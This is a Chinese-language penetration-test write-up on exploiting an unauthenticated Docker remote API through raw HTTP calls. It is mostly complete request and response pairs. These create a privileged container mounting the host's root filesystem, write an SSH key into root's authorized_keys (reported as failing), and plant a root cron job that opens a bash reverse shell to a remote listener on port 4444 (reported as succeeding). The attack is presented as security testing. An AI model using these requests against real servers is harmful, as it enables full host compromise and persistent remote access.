# 简介

在内网进行安全测试发现有台服务器存在“docker api未授权”漏洞，由于 **测试主机没有docker客户端软件**
，无法使用docker命令利用该漏洞。 **通过查看资料发现docker remote api提供http方式的调用** ，本文将利用根据此方式进行研究。

# 漏洞证明

  1. 访问该接口返回所有容器的信息，证明漏洞存在。

    
    
    GET /containers/json HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    

docker
api未授权经常使用的两种利用手法，一种是写入公钥进行免密要登录，一种是写入定时任务进行shell反弹。下边将利用api接口分别研究这两种方式。

# 漏洞利用一

  1. 使用接口 `/containers/create`创建容器，并把宿主机的”/”目录挂载到容器的”/mnt”目录下

    
    
    POST /containers/create HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/json
    Content-Length: 130
    
    {"HostName":"remoteCreate","User":"root","Image":"nginx/ntpd:4.2.6p5","HostConfig":{"Binds":["/:/mnt"],
    "Privileged":true}}
    
    
    //容器创建成功，并返回容器id
    HTTP/1.1 201 Created
    Api-Version: 1.38
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.06.1-ce (linux)
    Date: Mon, 18 Apr 2022 09:00:07 GMT
    Content-Length: 90
    Connection: close
    
    {"Id":"bf66daca7460399b526679ef828e9e23af1406363051163d32f528c3fdf035ed","Warnings":null}
    

  2. 根据容器ID使用 `/containers/Containers Id/start`接口启动容器

    
    
    POST /containers/bf66daca7460399b526679ef828e9e23af1406363051163d32f528c3fdf035ed/start HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 0
    
    
    HTTP/1.1 204 No Content
    Api-Version: 1.38
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.06.1-ce (linux)
    Date: Mon, 18 Apr 2022 09:04:19 GMT
    Connection: close
    

  3. 使用`/containers/Containers Id/exec`接口创建执行命令的实例（将私钥上传到容器中）。（此时还未上传成功，需要执行实例后才能上传成功）

    
    
    POST /containers/bf66daca7460399b526679ef828e9e23af1406363051163d32f528c3fdf035ed/exec HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/json
    Content-Length: 556
    
    {
    "AttachStdin":true,
    "AttachStdout":true,"AttachStderr":true,
    "DetachKeys":"ctrl-p,ctrl-q",
    "Tty":false,
    "Cmd":["sh","-c","echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdHlDQaOntjY21v3duDAd0XTezJCEzqOviJJvyFaguKS4ei+oOuilwilgZ0GRS6Vr92gBvbq5wELIH5D0cC/BoC6ZeTX34Wk0IIoLhC+Zrx2RtFYoQDdZQvl+3ZeSdwA7zce5uFhL70rGAajTcn17b0eVyYWaBGvGqskd/0ijEDDRQHP3vq5CillyBtkwKIyxJbE5kNI2kT8mOOHHJRRPNcL1ZxYTztYHEbzpKhRqgdzfDhCkZ8bOKduCwedA7wNJN65/dwPu/mvmahz8seHh/hMhrcRd5vblGUVtrCcgGa+IleAc38TxsNNdPJ4jvKJn++sL5ea3Bgxan5K9LPeRT ' >> /mnt/root/.ssh/authorized_keys"]
    }
    
    
    
    
    HTTP/1.1 201 Created
    Api-Version: 1.38
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.06.1-ce (linux)
    Date: Mon, 18 Apr 2022 09:08:20 GMT
    Content-Length: 74
    Connection: close
    
    {"Id":"1a2b0cdf0731a3d4abdc21df66dcdb025cc375756e978e66dd37cbf7090bca13"}
    

  4. 执行上一步的命令实例，由于文件存在映射，私钥文件直接保存在宿主机的“/root/.ssh”目录下。

    
    
    POST /exec/1a2b0cdf0731a3d4abdc21df66dcdb025cc375756e978e66dd37cbf7090bca13/start HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/json
    Content-Length: 27
    
    {"Detach":true,"Tty":false}
    
    HTTP/1.1 200 OK
    Api-Version: 1.38
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.06.1-ce (linux)
    Date: Mon, 18 Apr 2022 09:10:42 GMT
    Content-Length: 0
    Connection: close
    

  5. 免密登录未成功。使用 `/containers/id/archive`查看ssh配置文件发现，主机未开启ssh免密登录，因此该利用方式失败。  
![image](https://image.3001.net/images/20220912/1662965991_631ed8e7ec1823a3fb97e.png!small)

# 漏洞利用二

  1. 创建命令实例，添加定时任务。

    
    
    POST /containers/bf66daca7460399b526679ef828e9e23af1406363051163d32f528c3fdf035ed/exec HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/json
    Content-Length: 221
    
    {
    "AttachStdin":true,
    "AttachStdout":true,"AttachStderr":true,
    "DetachKeys":"ctrl-p,ctrl-q",
    "Tty":false,
    "Cmd":["sh","-c","echo '03 11 * * * bash -i >& /dev/tcp/40.*.*.*/4444 0>&1' >> /mnt/var/spool/cron/root"]
    }
    
    
    HTTP/1.1 201 Created
    Api-Version: 1.38
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.06.1-ce (linux)
    Date: Tue, 31 May 2022 02:56:50 GMT
    Content-Length: 74
    Connection: close
    
    {"Id":"12ed97fad32d2d592f45ff1eff3ffee7858e322cddc64820d555e0e779205f6a"}
    

  2. 执行上一步的命令实例，由于文件存在映射，会直接在宿主机的“/var/spool/cron/root”文件中添加定时任务。

    
    
    POST /exec/12ed97fad32d2d592f45ff1eff3ffee7858e322cddc64820d555e0e779205f6a/start HTTP/1.1
    Host: 40.*.*.*:4243
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/json
    Content-Length: 27
    
    {"Detach":true,"Tty":false}
    

  3. 攻击主机启动端口，等待反弹shell
  4. 反弹shell成功  
![image](https://image.3001.net/images/20220912/1662966092_631ed94c4aa768fc1c93e.png!small)

# 参考链接

<https://docs.docker.com/engine/api/v1.41/>

